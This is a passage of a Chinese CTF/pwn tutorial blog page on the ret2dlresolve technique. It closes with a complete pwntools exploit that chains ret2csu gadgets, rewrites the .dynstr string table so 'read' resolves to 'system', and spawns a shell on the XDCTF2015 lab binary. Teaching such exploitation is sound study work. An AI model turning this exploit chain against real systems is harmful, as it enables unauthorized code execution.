+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602143248861.png"
+                      class=""
+                >
+<p>发现是我们前面直接把read字符串换成system字符串写入后，后面用到的版本信息错位了。那么我们前面就需要确保后续信息的对齐，可以破坏掉一些已经解析过的libc函数的字符串缩减字符，由于不会再用到该字符串，所以无伤大雅。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145152644.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145718453.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145205542.png"
+                      class=""
+                >
+<p>将版本信息对齐后，就可以正常把system函数地址解析进入<strong>read
+got</strong>了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145921752.png"
+                      class=""
+                >
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004007a1</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line">read_got = <span class="number">0x601030</span></span><br><span class="line">gadget1 = <span class="number">0x40079A</span></span><br><span class="line">gadget2 = <span class="number">0x400780</span></span><br><span class="line"><span class="comment"># strtab = 0x600990</span></span><br><span class="line">main = <span class="number">0x40066E</span></span><br><span class="line">data = <span class="number">0x601500</span></span><br><span class="line">strtab = <span class="number">0x3fe438</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">call_got_addr, rdi_val, rsi_val, rdx_val, padding=<span class="number">0x78</span>, return_after_call=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * padding</span><br><span class="line">    payload += p64(gadget1)       <span class="comment"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)             <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)             <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(call_got_addr) <span class="comment"># r12 = GOT 地址</span></span><br><span class="line">    payload += p64(rdi_val)       <span class="comment"># r13 = edi</span></span><br><span class="line">    payload += p64(rsi_val)       <span class="comment"># r14 = rsi</span></span><br><span class="line">    payload += p64(rdx_val)       <span class="comment"># r15 = rdx</span></span><br><span class="line">    payload += p64(gadget2)       <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13; call [r12+rbx*8]</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">7</span>         <span class="comment"># 对齐，模拟返回值保存现场</span></span><br><span class="line">    payload += p64(return_after_call) <span class="keyword">if</span> return_after_call <span class="keyword">else</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;stdout&quot;</span>,<span class="string">b&quot;stdo&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, strtab, <span class="number">0x98</span>, return_after_call=main))</span><br><span class="line">p.send(dynstr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data, <span class="number">8</span>, return_after_call=main))</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span> + p64(ret) + p64(pop_rdi_ret) + p64(data) + p64(<span class="number">0x400546</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>但这种方法不是一直可以生效的，主要得看有没有可写的<strong>strtab</strong>。不如法一通用。</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 深入理解ret2dlresolve</li>
+        <li><strong>作者:</strong> collectcrop</li>
+        <li><strong>创建于
+                :</strong> 2025-06-02 20:41:28</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-06-02 20:42:08
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://collectcrop.github.io/2025/06/02/深入理解ret2dlresolve/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/blog/tags/pwn/">#pwn</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/blog/tags/gdb/">#gdb</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2024/09/22/go-pwn/" title="gopwn初探" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="gopwn初探" class="!max-w-none">
+  <span class="title">gopwn初探</span>
+</a><a class="recommended-article-item" href="/blog/2024/12/18/2024ciscn-长城杯初赛pwn方向部分题解/" title="2024ciscn&长城杯初赛pwn方向部分题解" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="2024ciscn&长城杯初赛pwn方向部分题解" class="!max-w-none">
+  <span class="title">2024ciscn&长城杯初赛pwn方向部分题解</span>
+</a><a class="recommended-article-item" href="/blog/2024/11/28/tls-dtor-list劫持exit执行-高版本glibc利用思路之一/" title="tls_dtor_list劫持exit执行-高版本glibc利用思路之一" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="tls_dtor_list劫持exit执行-高版本glibc利用思路之一" class="!max-w-none">
+  <span class="title">tls_dtor_list劫持exit执行-高版本glibc利用思路之一</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2024/09/22/go-pwn/" title="gopwn初探" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="gopwn初探" class="!max-w-none">
+  <span class="title">gopwn初探</span>
+</a><a class="recommended-article-item" href="/blog/2024/12/18/2024ciscn-长城杯初赛pwn方向部分题解/" title="2024ciscn&长城杯初赛pwn方向部分题解" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="2024ciscn&长城杯初赛pwn方向部分题解" class="!max-w-none">
+  <span class="title">2024ciscn&长城杯初赛pwn方向部分题解</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/blog/2025/05/26/litctf2025-writeup/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">litctf2025 writeup</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">深入理解ret2dlresolve</div>
+		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#dl_fixup%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B"><span class="nav-text">dl_fixup处理过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7%E8%A1%A8%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8"><span class="nav-text">1. 获取符号表与字符串表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E9%87%8D%E5%AE%9A%E4%BD%8D%E9%A1%B9"><span class="nav-text">2. 获取当前重定位项</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7%E9%A1%B9%E5%92%8C%E5%9C%B0%E5%9D%80"><span class="nav-text">3. 获取符号项和地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%AD%E8%A8%80%E5%BF%85%E9%A1%BB%E6%98%AF-plt-%E9%87%8D%E5%AE%9A%E4%BD%8D"><span class="nav-text">4. 断言：必须是 PLT 重定位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E7%AC%A6%E5%8F%B7%E6%98%AF%E5%90%A6%E5%8F%AF%E8%A7%81%E5%B9%B6%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">5.
+判断符号是否可见并查找真实地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%87%BA%E5%85%B7%E4%BD%93%E5%87%BD%E6%95%B0%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-text">6. 查询出具体函数的地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%AD%A3%E5%80%BC%E8%80%83%E8%99%91%E6%9E%B6%E6%9E%84%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A4%84%E7%90%86"><span class="nav-text">7. 修正值：考虑架构的特殊处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ifunc-%E5%A4%84%E7%90%86%E9%97%B4%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="nav-text">8. IFUNC 处理（间接函数）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9B%9E-got-%E8%A1%A8%E7%94%A8%E4%BA%8E%E5%90%8E%E7%BB%AD%E7%9B%B4%E6%8E%A5%E8%B7%B3%E8%BD%AC"><span class="nav-text">9. 写回 GOT
+表（用于后续直接跳转）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2dlresolve%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="nav-text">ret2dlresolve利用手法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#no-relro-64"><span class="nav-text">No RELRO-64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#partial-relro-64"><span class="nav-text">PARTIAL RELRO-64</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%95%E4%B8%80"><span class="nav-text">法一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C"><span class="nav-text">法二</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/blog/">collectcrop</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 31 篇文章
+                    </span>
+                    
+                        <span>
+                            共 171.7k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.1</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/blog/build/js/libs/Swup.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/blog/build/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/blog/build/js/utils.js" type="module"></script>
+
+<script src="/blog/build/js/main.js" type="module"></script>
+
+<script src="/blog/build/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/blog/build/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/blog/build/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/blog/build/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/blog/build/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/blog/build/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/blog/build/js/tools/runtime.js"></script>
+
+    
+<script src="/blog/build/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/blog/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/blog/build/js/libs/Typed.min.js"></script>
+
+  
+<script src="/blog/build/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/blog/build/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/blog/build/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/blog/build/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/blog/build/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/blog/build/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
